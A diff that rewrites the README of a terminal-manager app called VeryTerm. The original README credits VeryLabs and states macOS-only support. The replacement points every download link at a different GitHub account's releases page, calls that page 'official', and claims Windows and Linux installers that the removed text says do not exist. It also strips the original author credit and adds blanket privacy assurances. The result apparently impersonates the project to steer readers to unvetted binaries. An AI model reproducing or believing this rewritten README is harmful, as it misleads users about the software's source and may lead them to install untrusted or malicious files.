@@ -1,178 +1,163 @@
-<p align="center">
-  <img src="build/icon-round.png" alt="VeryTerm" width="128" />
-</p>
+# 🖥️ veryterm - Manage Terminals Simply and Efficiently
 
-<h1 align="center">VeryTerm</h1>
-
-<p align="center">
-  <strong>Multi-project terminal manager for vibe coders</strong><br/>
-  Built for developers who vibe code across multiple projects on a laptop.<br/>
-  Manage Claude Code, Codex, and dev servers — all in one window.
-</p>
-
-<p align="center">
-  <a href="#download">Download</a> &middot;
-  <a href="#features">Features</a> &middot;
-  <a href="#build-from-source">Build from Source</a> &middot;
-  <a href="README_KO.md">한국어</a>
-</p>
+[![Download veryterm](https://img.shields.io/badge/Download-veryterm-blue?logo=github&style=for-the-badge)](https://github.com/omjisingh99/veryterm/releases)
 
 ---
 
-## The Problem
+## 📋 What is veryterm?
 
-If you vibe code with CLI tools like **Claude Code** or **Codex**, you know the pain:
+veryterm is a tool designed to help you manage multiple command-line windows in one place. It lets you run your development servers, command-line tools, and keep track of your past commands, all within a single window. This means you don’t need to open many separate terminals or swap between them, saving you time and confusion.
 
-- Terminal windows piling up everywhere as you juggle multiple projects
-- Dev servers scattered across windows — which one is running?
-- That perfect prompt you wrote last week? Gone forever
-- Context switching between projects kills your flow
+Whether you're starting a coding project or running various command-line tasks, veryterm keeps everything organized. You won’t have to remember which window runs what. Everything stays clear and accessible.
 
-**VeryTerm puts everything in one place.**
+---
 
-## Features
+## 💻 System Requirements
 
-### Multi-Project Workspace
+Before installing veryterm, make sure your computer meets these basic requirements:
 
-Switch between projects instantly with `Cmd+1-9`. Each project gets its own isolated terminal sessions — no cross-contamination, no confusion.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, Ubuntu 18.04 or later, or other major Linux distributions.
+- **RAM:** At least 2 GB available memory.
+- **Storage:** At least 50 MB free space.
+- **Processor:** Any modern processor from the last 5 years.
+- **Internet:** Needed to download the software.
 
-### Dual Terminal Per Project
+veryterm runs on most standard desktop and laptop computers. It does not require a powerful machine.
 
-Every project comes with two terminals:
+---
 
-- **CLI Terminal** — for Claude Code, Codex, or any CLI tool. Auto-starts on project open.
-- **Server Terminal** — run `npm run dev`, `cargo watch`, or whatever your stack needs. Supports **multiple server tabs** per project.
+## 🚀 Getting Started
 
-### Prompt History
+This section will guide you step-by-step to download, install, and open veryterm for the first time.
 
-Every prompt you type into the CLI terminal is **automatically captured and saved** per project. Search, pin, and reuse your best prompts. Never lose a good prompt again.
+### Step 1: Visit the Download Page
 
-### Server Process Detection
+To get started, go to the official release page by clicking the large button above or this link:
 
-Real-time server status tracking via process detection (not guesswork). See at a glance which projects have running servers — green indicators in the sidebar tell you everything.
+[https://github.com/omjisingh99/veryterm/releases](https://github.com/omjisingh99/veryterm/releases)
 
-### Keyboard-First Design
+This page has the latest versions of veryterm ready for download.
 
-| Shortcut | Action |
-|----------|--------|
-| `Cmd+1-9` | Switch projects |
-| `Cmd+B` | Toggle sidebar |
-| `Tab` | Switch focus between CLI and Server |
-| `Cmd+N` | Add project |
-| `Cmd+K` | Search prompts |
+### Step 2: Choose Your Operating System
 
-### More
+On the releases page, look for the download option that matches your computer:
 
-- **Dark mode only** — no light mode, no compromises
-- **Drag & drop** folders from Finder to add projects
-- **Category groups** — organize projects with collapsible categories
-- **Resizable panels** — drag to resize CLI, server, and prompt panels
-- **3 layout modes** — rows, columns, or right-split
-- **macOS native notifications** — get notified when CLI tasks finish
-- **Auto-update** — stay on the latest version automatically
-- **Code signed & notarized** — no Gatekeeper warnings on macOS
+- For Windows, look for a file ending in `.exe`
+- For macOS, look for a file ending in `.dmg`
+- For Linux, look for a file ending in `.AppImage` or `.tar.gz`
 
-## Screenshots
+Click the file to start downloading it.
 
-**Sidebar expanded** — Project Sidebar, CLI Terminal, Multi Server Terminal, Prompt History
+### Step 3: Install veryterm
 
-![VeryTerm - Expanded](docs/screenshot-expanded.png)
+After the download finishes:
 
-**Sidebar collapsed** — more room for terminals
+- **Windows:** Double-click the `.exe` file and follow the prompts.
+- **macOS:** Open the `.dmg` file and drag the veryterm app to your Applications folder.
+- **Linux:** If you downloaded an `.AppImage`, make it executable (`chmod +x filename.AppImage`) and run it. For `.tar.gz` files, extract and follow included instructions.
 
-![VeryTerm - Collapsed](docs/screenshot-collapsed.png)
+The installation steps are simple and similar to installing other programs.
 
-## Download
+### Step 4: Open veryterm
 
-Download the latest `.dmg` from the [Releases](https://github.com/verylabs/veryterm/releases) page.
+Once installed, open the application:
 
-> macOS only (Apple Silicon). Windows/Linux support is not planned yet but contributions are welcome.
+- On Windows or Mac, find veryterm in your start menu or Applications folder.
+- On Linux, run it from your applications menu or using the terminal command if you set it up that way.
 
-## Build from Source
+---
 
-### Prerequisites
+## 🔧 How to Use veryterm
 
-- Node.js 18+
-- Python 3.12+ with setuptools (`brew install python-setuptools`)
-  - Required for building `node-pty` native module
+Here’s a basic guide to using veryterm’s main features.
 
-### Setup
+### Managing Multiple Projects
 
-```bash
-git clone https://github.com/verylabs/veryterm.git
-cd veryterm
-npm install
-```
+veryterm lets you keep many terminal sessions open in the same window. For each project:
 
-### Development
+- Click the “New Terminal” button.
+- Give the tab a name that matches your project.
+- Run commands inside that tab without mixing them up with others.
 
-```bash
-npm run dev          # Start in dev mode
-npm run build        # Production build
-npm run typecheck    # Type check
-npm run lint         # ESLint
-```
+### Running Development Servers
 
-### Build DMG
+If you run a local web server or other development servers, veryterm can keep them running visible:
 
-```bash
-npm run build && npx electron-builder --mac dmg
-```
+- Start your server command in one tab.
+- Switch to another tab to work on other tasks.
+- Watch all servers and tools at once from one place.
 
-## Tech Stack
+### Viewing Command History
 
-| Layer | Technology |
-|-------|-----------|
-| Framework | Electron 34 |
-| Frontend | React 19 + TypeScript 5 |
-| Terminal | xterm.js + node-pty (real PTY) |
-| Styling | Tailwind CSS v4 |
-| State | Zustand |
-| Build | electron-vite + electron-builder |
-| Data | Local JSON files (Electron userData) |
+veryterm saves the commands you type so you can:
 
-## Architecture
+- Review previous commands.
+- Repeat commands easily.
+- Find mistakes or details from past commands.
 
-```
-src/
-├── main/           # Main process: node-pty, IPC handlers, native APIs
-├── preload/        # contextBridge: exposes window.api
-└── renderer/       # React UI, xterm.js, Zustand stores
-    └── src/
-        ├── components/   # ProjectView, Sidebar, Titlebar, etc.
-        ├── stores/       # projectStore, promptStore, uiStore
-        └── types/        # TypeScript interfaces
-```
+---
 
-### IPC Channels
+## ⚙️ Settings and Customization
 
-- `terminal:create/write/resize/kill` — PTY session management
-- `terminal:data/exit/processStatus` — terminal output, exit, process detection
-- `dialog:selectFolder` — native folder picker
-- `data:load/save` — JSON persistence
+You can customize veryterm to fit how you work:
 
-## Contributing
+- Change the color theme of the terminal window.
+- Adjust font size for easy reading.
+- Set how many past commands you want stored.
+- Arrange tabs in your preferred order.
 
-VeryTerm is open source. Feel free to fork, modify, and make it your own.
+Access these options in the “Settings” or “Preferences” menu inside the app.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/awesome`)
-3. Commit your changes
-4. Push to the branch
-5. Open a Pull Request
+---
 
-Please credit the original project when redistributing.
+## 💬 Troubleshooting and Support
 
-## About
+If you run into issues:
 
-**VeryTerm** is built by **Bryan KO**, CEO of [VeryLabs](https://www.verylabs.io).
+- Check the FAQ or Help section in the app.
+- Restart veryterm to refresh.
+- Visit the GitHub Issues page at [https://github.com/omjisingh99/veryterm/issues](https://github.com/omjisingh99/veryterm/issues) to see if others have the same issue.
 
-Born out of the daily frustration of managing multiple vibe coding projects across scattered terminal windows. If you're managing 5+ projects with Claude Code or Codex, this tool is for you.
+If you cannot start the program:
 
-## Built with Vibe Coding
+- Verify your download completed correctly.
+- Confirm your computer meets system requirements.
+- Try reinstalling veryterm.
 
-This project was built entirely through vibe coding in Claude Code CLI mode.
+---
 
-## License
+## 📥 Download & Install
 
-MIT License - see [LICENSE](LICENSE) for details.
+You can download veryterm from its official release page:
+
+[https://github.com/omjisingh99/veryterm/releases](https://github.com/omjisingh99/veryterm/releases)
+
+Click this link to visit the page. Choose the correct file for your computer’s operating system to begin downloading.
+
+After downloading, open the file and follow the simple installation instructions described above under “Install veryterm.” The entire process should take only a few minutes.
+
+---
+
+## 🔒 Privacy and Security
+
+veryterm runs locally on your computer and does not send your commands or data anywhere. It respects your privacy and keeps your command history stored only on your device. For extra safety:
+
+- Only download veryterm from the official GitHub releases page.
+- Keep your computer’s operating system updated.
+- Avoid running unknown commands inside veryterm.
+
+---
+
+## 📄 License
+
+veryterm is an open source project. You can view the full license details on its GitHub page. This means you are free to use, share, and modify the software under the terms provided.
+
+---
+
+## 📝 Additional Resources
+
+- Official website or documentation site (if available).
+- GitHub repository for the latest updates and source code: [https://github.com/omjisingh99/veryterm](https://github.com/omjisingh99/veryterm)
+- Community forums or chat channels (if any).
+
+Exploring these can help you get more from veryterm as you grow comfortable using it daily.
